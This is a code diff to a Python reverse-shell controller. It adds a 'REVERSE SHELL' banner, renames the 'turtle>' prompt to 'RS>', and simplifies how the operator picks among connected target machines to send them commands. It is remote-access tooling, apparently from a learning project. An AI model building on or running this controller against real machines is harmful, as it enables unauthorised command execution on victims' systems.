@@ -32,6 +32,7 @@ def bind_socket():
         global host
         global port
         global s
+        print("------------------REVERSE SHELL---------------------------")
         print("binding the port"+str(port))
          
         
@@ -101,19 +102,20 @@ def accepting_connection():
 # interactive prompt for sending commands
 
 def start_turtle():
-     while True:  
-        cmd= input('turtle> ')
-
+     while True: 
+        print("Select the connection")
+        list_connections() 
+        cmd= input('RS> ')
+      
         if cmd== 'list':         # turtle> list     
             list_connections()
 
-        elif 'select' in cmd:
+        else:
          conn= get_target(cmd)
          if conn is not None:
             send_target_commands(conn)  
 
-        else:
-            print("Command not recognized")
+
 
 # Display all current active connections with the client
 
@@ -135,8 +137,8 @@ def list_connections():
     
 def get_target(cmd):
     try:
-        target = cmd.replace('select ','')
-        target= int(target)
+        
+        target= int(cmd)
         conn = all_connections[target]
         print('You are connected to :'+ str(all_address[target][0]))
         print(str(all_address[target][0])+">", end="")
@@ -185,9 +187,9 @@ def work():
 def create_jobs():
     for x in JOB_NUMBER:
         queue.put(x)
-
     queue.join()
+    return
 
- 
 create_workers()
 create_jobs()
+
